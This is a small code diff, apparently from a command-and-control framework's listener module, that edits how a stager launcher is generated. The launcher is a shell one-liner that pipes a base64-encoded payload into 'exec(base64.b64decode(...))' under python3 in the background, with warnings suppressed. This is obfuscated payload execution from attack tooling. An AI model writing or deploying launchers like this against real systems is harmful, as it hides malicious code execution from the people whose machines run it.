@@ -532,7 +532,7 @@ class Listener(object):
                     launchEncoded = base64.b64encode(launcherBase.encode('UTF-8')).decode('UTF-8')
                     if isinstance(launchEncoded, bytes):
                         launchEncoded = launchEncoded.decode('UTF-8')
-                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | /usr/bin/python3 &" % (
+                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | python3 &" % (
                         launchEncoded)
                     return launcher
                 else:
